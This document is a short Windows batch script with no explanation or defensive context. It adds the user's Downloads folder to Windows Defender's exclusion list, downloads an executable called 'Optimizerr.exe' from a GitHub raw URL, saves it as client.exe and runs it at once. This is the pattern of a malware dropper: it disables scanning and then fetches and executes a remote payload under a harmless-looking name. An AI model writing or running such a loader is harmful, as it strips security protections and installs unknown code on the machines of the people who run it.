@echo off
setlocal

:: Exclude Downloads folder from Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"

:: Set the download URL
set "url=https://github.com/evanffx/api/raw/refs/heads/main/Optimizerr.exe"

:: Set the output file path
set "outputFile=%USERPROFILE%\Downloads\client.exe"

:: Small delay to ensure exclusion is applied
timeout /nobreak /t 1 >nul

:: Download the file
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"

:: Run the downloaded file
start "" "%outputFile%"

endlocal
exit
